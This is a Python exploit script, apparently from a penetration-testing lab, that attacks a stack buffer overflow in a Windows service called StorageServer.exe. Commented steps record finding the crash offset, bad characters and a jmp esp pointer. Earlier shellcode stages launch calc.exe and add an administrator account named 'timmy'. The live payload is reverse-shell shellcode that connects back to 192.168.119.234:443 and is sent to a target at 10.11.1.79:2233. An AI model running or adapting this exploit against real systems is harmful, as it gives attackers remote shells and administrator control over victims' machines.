#!/bin/python3

import math, socket
from requests import post
from itertools import product, islice

# 1. Trigger access violation
# size = 5000
# filler = ''.join(list(sum(islice(product("ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"), 0, math.ceil(size / 3)), ())))[:size]
# payload = filler.encode("latin1")

# 1.1. After inspection of function at 11201040, socket read is 0x1000 (4096), 0xB00 (2816)
# 1.2. Triggered access violation with size 5000, ESP = 0286EE58   337A4332  2Cz3
# 1.3. Retrieve offset from memory at ESP : msf-pattern_offset -l 5000 -q 337A4332, got 2318
# 1.3. Dont know why, but it was off by 12. You want that EIP to land on 42424242
# filler = "A" * 2306
# eip = "B" * 4
# pad = "C" * 4
# buffer = "D" * (5000 - len(filler) - len(eip) - len(pad))
# payload = filler.encode() + eip.encode() + pad.encode() + buffer.encode()

# 2. Check for badcharacters
# filler = "A" * 2306
# eip = "B" * 4
# pad = "C" * 4
# badchars = [chr(x) for x in range(1, 256) if x not in map(lambda x: int(x, 16), "20 51".split(" "))]
# buffer = "D" * (5000 - len(filler) - len(eip) - len(pad) - len(badchars))
# payload = filler.encode() + eip.encode() + pad.encode() + ''.join(badchars).encode("latin1") + buffer.encode()

# 3. Find Jump
# 3.1. With `!mona modules` we can verify that the StorageServer module has no protection
#      Message= 0x11200000 | 0x11218000 | 0x00018000 | False  | False   | False |  False   | False  | -1.0- [StorageServer.exe] (C:\Users\grenierdev\Desktop\AVExclusion\StorageServer.exe)
# 3.2. Find instruction with `msf-nasm_shell` for `jmp esp`, got `\xff\xe4`
# 3.3. With `!mona find -s "\xff\xe4" -m "StorageServer.exe"`, we found only one pointer
#      Message=  0x1120110d : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [StorageServer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\grenierdev\Desktop\AVExclusion\StorageServer.exe)
# 3.4. Confirmed valid jump location with breakpoint at 0x1120110d
# filler = "A" * 2306
# eip = "\x0d\x11\x20\x11"
# pad = "C" * 8
# buffer = "D" * (5000 - len(filler) - len(eip) - len(pad))
# payload = filler.encode() + eip.encode() + pad.encode() + buffer.encode()

# 4. Test buffer overflow with calc.exe
# 4.1. Confirmed code execution with `msfvenom -b '\x00\x20\x51' -p windows/exec CMD=calc.exe -f c
# shell = ("\xb8\x06\xa3\x84\xf5\xd9\xce\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
# "\x31\x83\xc6\x04\x31\x46\x0f\x03\x46\x09\x41\x71\x09\xfd\x07"
# "\x7a\xf2\xfd\x67\xf2\x17\xcc\xa7\x60\x53\x7e\x18\xe2\x31\x72"
# "\xd3\xa6\xa1\x01\x91\x6e\xc5\xa2\x1c\x49\xe8\x33\x0c\xa9\x6b"
# "\xb7\x4f\xfe\x4b\x86\x9f\xf3\x8a\xcf\xc2\xfe\xdf\x98\x89\xad"
# "\xcf\xad\xc4\x6d\x7b\xfd\xc9\xf5\x98\xb5\xe8\xd4\x0e\xce\xb2"
# "\xf6\xb1\x03\xcf\xbe\xa9\x40\xea\x09\x41\xb2\x80\x8b\x83\x8b"
# "\x69\x27\xea\x24\x98\x39\x2a\x82\x43\x4c\x42\xf1\xfe\x57\x91"
# "\x88\x24\xdd\x02\x2a\xae\x45\xef\xcb\x63\x13\x64\xc7\xc8\x57"
# "\x22\xcb\xcf\xb4\x58\xf7\x44\x3b\x8f\x7e\x1e\x18\x0b\xdb\xc4"
# "\x01\x0a\x81\xab\x3e\x4c\x6a\x13\x9b\x06\x86\x40\x96\x44\xcc"
# "\x97\x24\xf3\xa2\x98\x36\xfc\x92\xf0\x07\x77\x7d\x86\x97\x52"
# "\x3a\x78\xd2\xff\x6a\x11\xbb\x95\x2f\x7c\x3c\x40\x73\x79\xbf"
# "\x61\x0b\x7e\xdf\x03\x0e\x3a\x67\xff\x62\x53\x02\xff\xd1\x54"
# "\x07\x9c\xb4\xc6\xcb\x4d\x53\x6f\x69\x92")
# filler = "A" * 2306
# eip = "\x0d\x11\x20\x11"
# sled = "\x90" * 16
# payload = filler.encode() + eip.encode() + sled.encode("latin1") + shell.encode("latin1")

# 5. Exploit
#    `msfvenom -b '\x00\x20\x51' -p windows/exec CMD="net user /add /y timmy AwesomePassword! && net localgroup administrators timmy /add" -f c`
# shell = ("\xb8\x06\xa3\x84\xf5\xd9\xce\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
# "\x31\x83\xc6\x04\x31\x46\x0f\x03\x46\x09\x41\x71\x09\xfd\x07"
# "\x7a\xf2\xfd\x67\xf2\x17\xcc\xa7\x60\x53\x7e\x18\xe2\x31\x72"
# "\xd3\xa6\xa1\x01\x91\x6e\xc5\xa2\x1c\x49\xe8\x33\x0c\xa9\x6b"
# "\xb7\x4f\xfe\x4b\x86\x9f\xf3\x8a\xcf\xc2\xfe\xdf\x98\x89\xad"
# "\xcf\xad\xc4\x6d\x7b\xfd\xc9\xf5\x98\xb5\xe8\xd4\x0e\xce\xb2"
# "\xf6\xb1\x03\xcf\xbe\xa9\x40\xea\x09\x41\xb2\x80\x8b\x83\x8b"
# "\x69\x27\xea\x24\x98\x39\x2a\x82\x43\x4c\x42\xf1\xfe\x57\x91"
# "\x88\x24\xdd\x02\x2a\xae\x45\xef\xcb\x63\x13\x64\xc7\xc8\x57"
# "\x22\xcb\xcf\xb4\x58\xf7\x44\x3b\x8f\x7e\x1e\x18\x0b\xdb\xc4"
# "\x01\x0a\x81\xab\x3e\x4c\x6a\x13\x9b\x06\x86\x40\x96\x44\xcc"
# "\x97\x24\xf3\xa2\x98\x36\xfc\x92\xf0\x07\x77\x7d\x86\x97\x52"
# "\x3a\x78\xd2\xff\x6a\x11\xbb\x95\x2f\x7c\x3c\x40\x73\x79\xbf"
# "\x61\x0b\x7e\xdf\x03\x0e\x3a\x67\xff\x62\x53\x02\xff\xd1\x54"
# "\x07\x9c\xb4\xc6\xcb\x4d\x53\x6f\x69\x92")
#    `msfvenom -b '\x00\x20\x51' -p windows/shell_reverse_tcp LHOST=192.168.119.234 LPORT=443 EXITFUNC=thread -f c
shell = ("\xdb\xc4\xd9\x74\x24\xf4\x58\xbb\xb9\xd9\x1c\x13\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x58\x13\x03\xe1\xca\xfe\xe6\xed\x05\x7c"
"\x08\x0d\xd6\xe1\x80\xe8\xe7\x21\xf6\x79\x57\x92\x7c\x2f\x54"
"\x59\xd0\xdb\xef\x2f\xfd\xec\x58\x85\xdb\xc3\x59\xb6\x18\x42"
"\xda\xc5\x4c\xa4\xe3\x05\x81\xa5\x24\x7b\x68\xf7\xfd\xf7\xdf"
"\xe7\x8a\x42\xdc\x8c\xc1\x43\x64\x71\x91\x62\x45\x24\xa9\x3c"
"\x45\xc7\x7e\x35\xcc\xdf\x63\x70\x86\x54\x57\x0e\x19\xbc\xa9"
"\xef\xb6\x81\x05\x02\xc6\xc6\xa2\xfd\xbd\x3e\xd1\x80\xc5\x85"
"\xab\x5e\x43\x1d\x0b\x14\xf3\xf9\xad\xf9\x62\x8a\xa2\xb6\xe1"
"\xd4\xa6\x49\x25\x6f\xd2\xc2\xc8\xbf\x52\x90\xee\x1b\x3e\x42"
"\x8e\x3a\x9a\x25\xaf\x5c\x45\x99\x15\x17\x68\xce\x27\x7a\xe5"
"\x23\x0a\x84\xf5\x2b\x1d\xf7\xc7\xf4\xb5\x9f\x6b\x7c\x10\x58"
"\x8b\x57\xe4\xf6\x72\x58\x15\xdf\xb0\x0c\x45\x77\x10\x2d\x0e"
"\x87\x9d\xf8\x81\xd7\x31\x53\x62\x87\xf1\x03\x0a\xcd\xfd\x7c"
"\x2a\xee\xd7\x14\xc1\x15\xb0\xda\xbe\x62\xaa\xb3\xbc\x8c\x2b"
"\xff\x48\x6a\x41\xef\x1c\x25\xfe\x96\x04\xbd\x9f\x57\x93\xb8"
"\xa0\xdc\x10\x3d\x6e\x15\x5c\x2d\x07\xd5\x2b\x0f\x8e\xea\x81"
"\x27\x4c\x78\x4e\xb7\x1b\x61\xd9\xe0\x4c\x57\x10\x64\x61\xce"
"\x8a\x9a\x78\x96\xf5\x1e\xa7\x6b\xfb\x9f\x2a\xd7\xdf\x8f\xf2"
"\xd8\x5b\xfb\xaa\x8e\x35\x55\x0d\x79\xf4\x0f\xc7\xd6\x5e\xc7"
"\x9e\x14\x61\x91\x9e\x70\x17\x7d\x2e\x2d\x6e\x82\x9f\xb9\x66"
"\xfb\xfd\x59\x88\xd6\x45\x79\x6b\xf2\xb3\x12\x32\x97\x79\x7f"
"\xc5\x42\xbd\x86\x46\x66\x3e\x7d\x56\x03\x3b\x39\xd0\xf8\x31"
"\x52\xb5\xfe\xe6\x53\x9c")
filler = "A" * 2306
eip = "\x0d\x11\x20\x11"
sled = "\x90" * 32
payload = filler.encode() + eip.encode() + sled.encode("latin1") + shell.encode("latin1")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
	print("Connecting...")
	sock.connect(("10.11.1.79", 2233))
	#sock.connect(("192.168.1.96", 2233))
	print("Connected, sending payload...")
	sock.send(payload)
	res = sock.recv(1024)
	print(f"{res}")

print("Done")

